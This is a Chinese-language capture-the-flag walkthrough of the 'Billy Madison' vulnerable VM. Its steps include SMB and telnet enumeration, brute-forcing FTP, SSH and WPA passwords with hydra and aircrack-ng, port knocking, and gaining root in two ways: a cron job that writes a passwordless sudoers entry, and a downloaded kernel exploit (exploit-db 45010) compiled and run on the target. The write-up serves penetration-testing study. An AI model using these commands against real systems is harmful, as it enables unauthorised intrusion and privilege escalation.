# mynew 
smb枚举
telent枚举
ftp枚举
web枚举部分密码怎么处理wfuzz目录爆破找指定类型的文件
。cap文件分析
端口敲震
swaks邮件发送
通过。cap无线密码破解
计划任务+复制（suid）+技巧提权
VeraCrypt解密

#


VMware双击打开，默认nat模式即可！

1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.191)

----------------------------------------
----------------------------------------
2、nmap 192.168.253.191 -p- -A
22/tcp   open   tcpwrapped
23/tcp   open   telnet?
69/tcp   open   caldav      Radicale calendar and contacts server (Python BaseHTTPServer)
http-generator: WordPress 1.0
80/tcp   open   http        Apache httpd 2.4.18 ((Ubuntu))
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
2525/tcp open   smtp        SubEtha smtpd
smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok

----------------------------------------
----------------------------------------
3、**Samba信息枚举**（项目十有讲述）

使用nmap脚本smb-enum-shares.nse进行枚举：
**nmap -v --script smb-enum-shares.nse -p445 192.168.253.191**

--------------------
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.253.191\EricsSecretStuff: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\WeaselLaugh
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.253.191\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (BM)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
--------------------
发现EricsSecretStuff可以匿名访问和写入！


smbclient \\\\192.168.253.191\\EricsSecretStuff\\

1）**enum4linux -a 192.168.253.191   ---枚举所有信息**
2）**smbclient -L //192.168.253.191**
	Sharename       Type      Comment
	---------       ----      -------
	EricsSecretStuff Disk      
	IPC$            IPC       IPC Service (BM)

3）**smbclient ///EricsSecretStuff -I 192.168.253.191 -N**
-I<IP地址> 指定服务器的IP地址
-N 不用询问密码
get ebd.txt

cat ebd.txt      
Erics backdoor is currently CLOSED---Erics后门目前已关闭！这条路不通！

有3个用户，分别是Billy、Veronica和Eric
----------------------------------------
----------------------------------------
4、telnet枚举23

telnet 192.168.253.191 23

 I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!
 Connection closed by foreign host.

**说曾经使用过rkfpuzrahngvat密匙的ROTten密码
ROTten线索应该是ROT10编码，现在ROT13是最流行的ROT编码**

----------------------------------------
----------------------------------------
5、解码-web信息收集（项目三十三也介绍过）
要解码线索，使用tr命令：
https://www.runoob.com/linux/linux-comm-tr.html

Linux tr 命令用于转换或删除文件中的字符。
tr 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备。

echo rkfpuzrahngvat | tr a-z n-za-m
exschmenuating

或者这里解密：https://cryptii.com/

访问：
http://192.168.253.191/exschmenuating/

可看到veronica可能是密码一部分的线索！有一个.captured文件！


 **grep 'veronica' /root/Desktop/rockyou.txt > dayu**
 
wc -l zc        
773 dayu
针对单词列表文件rockyou.txt，过滤掉了veronica所有单词，只剩773个！


----------------------------------------
----------------------------------------
6、目录爆破
**wfuzz -c --hc=400,404 -z file,zchttp://192.168.253.191/exschmenuating/FUZZ.cap**

000000772:   200        24 L     162 W      1080 Ch     "#0104veronica"
000000766:   200        192 L    800 W      8528 Ch     "012987veronica"


----------------------------------------
----------------------------------------
7、wireshark分析流量

下载流量包：
http://192.168.253.191/exschmenuating/012987veronica.cap

Eric和Veronica之间的 6 封电子邮件的内容！第二封邮件发现需要开启ftp需要看视频端口碰撞开启ftp！

**tcp.stream eq 1**
https://www.youtube.com/watch?v=z5YU7JwVy7s

----------------------------------------
----------------------------------------
8、端口敲震

通过查看Youtube视频，得到了端口爆震序列：1466, 67, 1469 ,1514, 1981, 1986, 1588....

**knock -v 192.168.253.191 1466 67 1469 1514 1981 1986**

nmap 192.168.253.191 -p21
21/tcp open  ftp


----------------------------------------
----------------------------------------
9、FTP信息枚举-ftp爆破

第三封邮件：
Thanks that will be perfect.  Please set me up an account with username of "eric" and password "ericdoesntdrinkhisownpee."

从012987veronica.cap邮件中的信息可以看到，存在 eric/ericdoesntdrinkhisownpee账号密码！


ftp 192.168.253.191
eric
ericdoesntdrinkhisownpee
get .notes

新的隐密端口将打开，存在Wifi密码，Veronica或Billy知道密码，签入Veronica的FTP文件夹。
观看了视频，13秒的视频，念了一句话：My kid will be a soccer player

1）新的端口即将开放？
2）Wifi密码？
3）Veronica或Billy知道密码？
4）爆破Veronica ftp用户！
5）发送邮件：My kid will be a soccer player

veronica ftp爆破

hydra -l veronica -P dayu.txt ftp://192.168.253.191
[21][ftp] host: 192.168.253.191   login: veronica   password: babygirl_veronica07@yahoo.com

知识拓展：
https://blog.csdn.net/CliffordR/article/details/81050414
ncrack暴力破解FTP：
ncrack -u veronica -P dayu.txt -T 5 192.168.253.191 -p 21


ftp 192.168.253.191
veronica
babygirl_veronica07@yahoo.com
-rwxrwxrwx 1 ftp 719128 Aug 17 12:16 eg-01.cap
-rwxrwxrwx 1 ftp 595 Aug 20 12:55 email-from-billy.eml

get eg-01.cap
get email-from-billy.eml


email-from-billy.eml提示：
1）用了swaks发送邮件
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
2）讲述了他如何破解 Eric 的无线密码


----------------------------------------
----------------------------------------
10、邮件发送

swaks 是一个 SMTP 服务器，它是由 John Jetmore 开发的一个功能强大、灵活、可编写脚本、面向事务的工具。

eric@madisonhotels.com
vvaughn@polyfector.edu
2525    smtp
My kid will be a soccer player   ---内容

**swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.139.1561:2525 --body "My kid will be a soccer player"  --header "Subject: My kid will be soccer player"**

或者手写！！
按照意思发送了一封邮件过去！
<-  221 Bye
=== Connection closed with remote host.


nmap 192.168.253.191 -p- -A
1974/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)


----------------------------------------
----------------------------------------
   >
11、无线设备

遇到文件下载不足报错！一会登录进去查看！
---------------------------------------
**.cap文件就是流量文件，流量就像Wireless traffic和eml文件一样
这边需要破解WPA/WPA2密码，可以用aircrack-ng或hashcat来完成！

aircrack-ng -w /root/Desktop/rockyou.txt eg-01.cap**
---------------------------------------

hydra -l eric -P /root/Desktop/rockyou.txt -s 1974 ssh://192.168.253.191
爆破需要N久！！！

ssh eric@192.168.253.191 -p 1974
triscuit*

分析下无线文件包：
find / -name eg-01.cap 2>/dev/null
cp /opt/coloradoftp-prime/home/veronica/eg-01.cap /tmp
cd /tmp
which nc
nc -l 9999 < eg-01.cap
nc 192.168.253.191 9999 > eg-01.cap

发现防火墙不允许传输，先放着！！

项目三十六教过scp文件上传，现在教scp文件下载：
有两种方法：

sudo scp -P 1974 -r eric@192.168.253.191:/tmp/eg-01.cap /root/tmp/
triscuit*
scp也不行！！！

MobaXterm.exe
成功下载！！

aircrack-ng -w /root/Desktop/rockyou.txt eg-01.cap   ---开始爆破！！

      [00:10:24] 3039782/14344392 keys tested (4940.73 k/s) 

      Time left: 38 minutes, 8 seconds                          21.19%

                           KEY FOUND! [ triscuit* ]
10分钟才爆破出来~~~


----------------------------------------
----------------------------------------
12、内部信息枚举
上传linpeas：

1）Linux version 4.4.0-36-generic
2）防火墙规则：
*filter
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 23 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 69 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 137 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 138 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 139 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 445 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 2525 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
果然开放了限制！
3）普通用户枚举：
billy:x:1000:1000    uid=1000(billy)27(sudo)
veronica:x:1001:1001
eric:x:1002:1002
4）SUID枚举
find / -perm -4000 2>/dev/null
/usr/local/share/sgml/donpcgd


----------------------------------------
----------------------------------------
13、提权

1）方法1：计划任务+复制+技巧提权

查看权限：
ls -la /usr/local/share/sgml/donpcgd
-r-sr-s--- 1 root eric 372922 Aug 20  2016 /usr/local/share/sgml/donpcgd
可以看到uid是root权限执行！那么提权就拿到root权限了！

如果使用：
/usr/local/share/sgml/donpcgd
Usage: /usr/local/share/sgml/donpcgd path1 path2

测试功能：
echo 'hello' > dayu
/usr/local/share/sgml/donpcgd /tmp/zc/home/eric/dayu

/usr/local/share/sgml/donpcgd /tmp/zc/home/eric
#### mknod(/home/eric,81b4,0)
/home/eric: File exists
测试发现文件不存在！


/usr/local/share/sgml/donpcgd /tmp/zc/home/eric/dayu
#### mknod(/home/eric/dayu,81b4,0)
cat /home/eric/zc  ---无内容
该程序会将路径1中的文件复制到路径2（仅名称相同，但是内容不会被复制，新文件内容为空）




/usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test


参考文章：
https://qastack.cn/ubuntu/7676/function-of-etc-cron-hourly


touch /tmp/zc
/usr/local/share/sgml/donpcgd /tmp/zc/etc/cron.hourly/zc
echo -e '#!/bin/bash\necho "eric ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /etc/cron.hourly/zc
chmod +x /etc/cron.hourly/zc
cat /etc/cron.hourly/zc
等待一个小时~~~
sudo su




2）方法2：内核提权
Linux version 4.4.0-36-generic

locate 45010    
/usr/share/exploitdb/exploits/linux/local/45010.c
cp /usr/share/exploitdb/exploits/linux/local/45010.c .

python -m SimpleHTTPServer 8082
wget http://192.168.253.138:8082/45010.c
gcc 45010.c -o dayu
chmod +x dayu
./dayu
成功拿到shell！


root信息枚举：
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

*/1 * * * * /root/checkban/checkban.sh
*/10 * * * * /root/telnet.sh
*/1 * * * * /root/ssh/canyoussh.sh

/etc/crontab
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
每十七分钟执行一次！


Linux Crontab 定时任务：
https://www.runoob.com/w3cnote/linux-crontab-tasks.html
https://www.freebuf.com/articles/system/245636.html


eric ALL=(ALL) NOPASSWORD:ALL
You can create a file in /etc/sudoers.d/ and escalate privileges
发现已经加入执行好了！



----------------------------------------
----------------------------------------
14、代理抓取页面密码本

cd PRIVATE
-rw-rw-r--  1 billy billy 1048576 Aug 21  2016 BowelMovement
-rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt


cat hint.txt
Heh, I called the file BowelMovement because it has the same initials as
Billy Madison.  That truely cracks me up!  LOLOLOL!

I always forget the password, but it's here:

https://en.wikipedia.org/wiki/Billy_Madison

-EG

最终的flag说将文件命名为：BowelMovement
密码忘记了，但是放在了该网站：https://en.wikipedia.org/wiki/Billy_Madison

proxychains cewl -d 1 https://en.wikipedia.org/wiki/Billy_Madison -w dayu.txt
1~2分钟从代理抓取到密码本！

下载到本地：
cp BowelMovement /home/eric/


----------------------------------------
----------------------------------------
15、文件暴力破解：
trueCrack是一款TrueCrypt(Copyrigth) volume文件破解工具，它工作在Linux平台下并且基于Nvidia的Cuda技术做了优化。

truecrack -v -t BowelMovement -w dayu.txt
-v   ---显示计算消息
-t   ---Truecrypt卷文件

Found password:		"execrable"
Password length:	"10"
Total computations:	"10742"

获得密码：execrable

参考文章：
https://linsir.org/post/How-to-use-truecrack-to-crack-Truecrypt-file/

----------------------------------------
----------------------------------------
16、VeraCrypt解密

VeraCrypt是一款开放源代码的即时加密软件（OTFE），它可以创建一个虚拟加密磁盘文件或加密分区，或预引导认证整个存储设备（除非使用了UEFI或GPT），VeraCrypt是已经停止开发的TrueCrypt项目的一个分支。据其开发者声称，安全方面的改进已经落实，最初TrueCrypt的代码审计问题已得到解决。

https://zh.wikipedia.org/wiki/VeraCrypt


在项目三十一最后学习过：TrueCrypt
今天遇到的是VeraCrypt

他们的区别：
https://zhuanlan.zhihu.com/p/332546689


安装地址：
https://www.veracrypt.fr/en/Downloads.html

下载exe双击一直过即可，打开文件，双击A盘：
execrable   ---输入密码等待会

看到一个名为secret.zip的文件并将其解压缩

解压开获得信息：

Congratulations!

If you're reading this, you win!

I hope you had fun.  I had an absolute blast putting this together.

I'd love to have your feedback on the box - or at least know you pwned it!

Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with
the subject line: "Stop looking at me swan!"

Thanks much,

Brian Johnson
7 Minute Security
www.7ms.us














